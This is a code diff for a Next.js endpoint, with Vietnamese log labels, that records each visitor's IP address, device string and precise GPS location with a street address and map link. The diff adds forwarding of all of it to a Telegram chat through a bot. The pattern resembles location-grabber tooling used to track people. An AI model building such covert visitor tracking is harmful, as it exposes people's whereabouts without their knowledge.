@@ -3,6 +3,7 @@ import { NextResponse } from 'next/server';
 import fs from 'fs';
 import path from 'path';
 import { headers } from 'next/headers';
+import { getVerificationConfigAction } from '@/app/actions/settings';
 
 async function getAddress(lat: number, lon: number): Promise<string> {
     try {
@@ -20,6 +21,37 @@ async function getAddress(lat: number, lon: number): Promise<string> {
     }
 }
 
+async function sendTelegramNotification(message: string) {
+    try {
+        const config = await getVerificationConfigAction();
+        if (
+            !config.telegramNotificationsEnabled ||
+            !config.telegramBotToken ||
+            !config.telegramChatId
+        ) {
+            return;
+        }
+
+        const botToken = config.telegramBotToken;
+        const chatId = config.telegramChatId;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // No await here to avoid blocking the main response
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true,
+            }),
+        });
+    } catch (error) {
+        console.error('Failed to send Telegram notification:', error);
+    }
+}
+
 export async function POST(request: Request) {
   try {
     const body = await request.json();
@@ -34,9 +66,15 @@ export async function POST(request: Request) {
     // Clean up IPv6 mapped IPv4 addresses e.g. ::ffff:123.45.67.89
     const finalIp = clientIp.startsWith('::ffff:') ? clientIp.substring(7) : clientIp;
 
-    let logData = `--- [${new Date().toISOString()}] MỚI TRUY CẬP ---\n`;
+    const timestamp = new Date().toISOString();
+    let logData = `--- [${timestamp}] MỚI TRUY CẬP ---\n`;
     logData += `Thiết bị: ${ua}\n`;
     logData += `Địa chỉ IP: ${finalIp}\n`;
+
+    let telegramMessage = `*🔔 Truy cập mới!*\n\n`;
+    telegramMessage += `*Thời gian:* \`${new Date(timestamp).toLocaleString('vi-VN')}\`\n`;
+    telegramMessage += `*Thiết bị:* \`${ua}\`\n`;
+    telegramMessage += `*Địa chỉ IP:* \`${finalIp}\`\n`;
 
     if (lat !== undefined && lon !== undefined) {
       const address = await getAddress(lat, lon);
@@ -46,6 +84,11 @@ export async function POST(request: Request) {
       logData += `Độ chính xác: ${acc || 'N/A'}m\n`;
       logData += `Địa chỉ: ${address}\n`;
       logData += `Link Google Maps: ${maps_link}\n`;
+
+      telegramMessage += `*Vị trí:* ${address}\n`;
+      telegramMessage += `*Tọa độ:* \`${lat}, ${lon}\`\n`;
+      telegramMessage += `*Độ chính xác:* \`${acc || 'N/A'}m\`\n`;
+      telegramMessage += `*Bản đồ:* [Mở Google Maps](${maps_link})\n`;
     }
     
     logData += `----------------------------------\n`;
@@ -58,6 +101,9 @@ export async function POST(request: Request) {
     }
 
     fs.appendFileSync(logFile, logData, 'utf-8');
+    
+    // Send notification without blocking
+    sendTelegramNotification(telegramMessage);
     
     return NextResponse.json({ status: 'ok' });
   } catch (error) {
